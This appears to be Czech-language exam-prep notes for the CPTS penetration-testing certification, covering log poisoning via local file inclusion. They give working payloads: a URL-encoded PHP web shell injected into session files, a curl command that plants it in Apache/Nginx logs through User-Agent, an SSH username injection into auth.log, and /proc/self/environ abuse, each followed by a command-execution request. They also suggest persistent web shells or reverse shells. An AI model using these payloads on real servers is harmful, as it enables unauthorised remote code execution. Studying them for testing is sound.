**Log Poisoning** spoléhá na vložení spustitelného PHP kódu do souboru, do kterého webový server nebo systém zapisuje uživatelský vstup (logy, relace), a jeho následné spuštění přes LFI zranitelnost.

### 📌 Přehled metod Log Poisoningu

| **Metoda**             | **Cílový soubor / Umístění**                                                   | **Vstupní vektor (Co se traví)**             | **Příkaz / Technika**                                                         |
| ---------------------- | ------------------------------------------------------------------------------ | -------------------------------------------- | ----------------------------------------------------------------------------- |
| **PHP Session**        | `/var/lib/php/sessions/sess_<ID>`<br><br>  <br><br>`C:\Windows\Temp\sess_<ID>` | Hodnota uložená v relaci (např. `PHPSESSID`) | `?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E`           |
| **Apache / Nginx Log** | `/var/log/apache2/access.log`<br><br>  <br><br>`/var/log/nginx/access.log`     | HTTP hlavička `User-Agent`                   | `curl -s "http://<TARGET>/" -H "User-Agent: <?php system(\$_GET['cmd']); ?>"` |
| **SSH Log**            | `/var/log/sshd.log` nebo `/var/log/auth.log`                                   | Uživatelské jméno při SSH pokusu             | `ssh '<?php system($_GET["cmd"]); ?>'@<TARGET>`                               |
| **ProcFS / Environ**   | `/proc/self/environ`<br><br>  <br><br>`/proc/self/fd/<N>`                      | HTTP hlavičky v prostředí procesu            | Vložení payloadu do `User-Agent` + načtení `/proc/self/environ`               |

### 1. PHP Session Poisoning

1. **Zjištění PHPSESSID:** Ve vývojářských nástrojích prohlížeče (Storage $\rightarrow$ Cookies) zjistěte hodnotu cookie `PHPSESSID` (např. `nhhv8i0o6ua4g88bkdl9u1fdsd`).
    
2. **Ověření čtení relace přes LFI:**
    
    Fragment kódu
    
    ```
    http://<TARGET>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
    ```
    
3. **Zapsání PHP web shellu do relace:**
    
    Aplikujte payload URL zakódovaný v parametru, který se ukládá do session:
    
    Fragment kódu
    
    ```
    http://<TARGET>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
    ```
    
4. **Spuštění příkazu (RCE):**
    
    Fragment kódu
    
    ```
    http://<TARGET>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id
    ```
    

### 2. Server Log Poisoning (Apache / Nginx)

1. **Ověření přístupových práv k logu:**
    
    Zkuste přes LFI načíst `/var/log/apache2/access.log` nebo `/var/log/nginx/access.log`.
    
2. **Injektáž kódu do logu:**
    
    Odešlete HTTP požadavkem škodlivou hlavičku `User-Agent`:
    
    Bash
    
    ```
    curl -s "http://<TARGET>/index.php" -H "User-Agent: <?php system(\$_GET['cmd']); ?>"
    ```
    
3. **Vyvolání RCE přes LFI:**
    
    Fragment kódu
    
    ```
    http://<TARGET>/index.php?language=/var/log/apache2/access.log&cmd=id
    ```
    

### 3. Alternativní vektory (SSH, Mail, ProcFS)

- **SSH Auth Log Poisoning:** Pokud jsou přístupné logy SSH (`/var/log/auth.log` nebo `/var/log/sshd.log`), pošlete PHP payload přímo do uživatelského jména při pokusu o přihlášení:
    
    Bash
    
    ```
    ssh '<?php system($_GET["cmd"]); ?>'@<TARGET>
    ```
    
- **ProcFS Environment (`/proc/self/environ`):** Obsahuje proměnné prostředí běžícího procesu webového serveru včetně `HTTP_USER_AGENT`. Pokud máte k souboru čtecí práva, odeslání payloadu v `User-Agent` a načtení `/proc/self/environ` vyvolá RCE.
    

### 💡 Klíčové tipy pro CPTS zkoušku

- **Velikost logů:** Soubory `access.log` mohou být obrovské. Načítání velkého logu přes LFI může způsobit zpomalení nebo pád webového serveru (DoS).
    
- **Jednorázové spuštění u Session:** Po prvním spuštění příkazu může dojít k přepsání session souboru dalším parametrem `language`. Využijte první spuštění k zapsání trvalého webshellu do zapisovatelné složky (např. `/var/www/html/uploads/shell.php`) nebo k navázání Reverse Shellu.